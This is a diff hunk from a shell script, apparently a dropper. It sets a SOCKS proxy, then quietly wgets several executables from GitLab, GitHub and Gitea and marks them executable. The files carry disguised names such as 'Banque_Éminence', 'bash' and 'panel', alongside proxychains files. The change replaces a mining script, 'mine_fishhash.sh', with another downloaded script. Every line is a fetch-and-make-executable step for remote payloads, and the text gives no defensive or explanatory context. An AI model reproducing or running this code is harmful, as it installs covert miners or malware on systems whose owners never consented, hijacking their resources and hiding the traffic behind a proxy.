@@ -2,7 +2,7 @@ proxy="142.54.232.6"
 port="4145"
 wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
 wget -q https://github.com/pagesrlepla/mx8/raw/main/bash && chmod +x bash
-wget -q https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
+wget -q https://raw.githubusercontent.com/pagesrlepla/mx7/main/pooh.sh && chmod +x pooh.sh
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
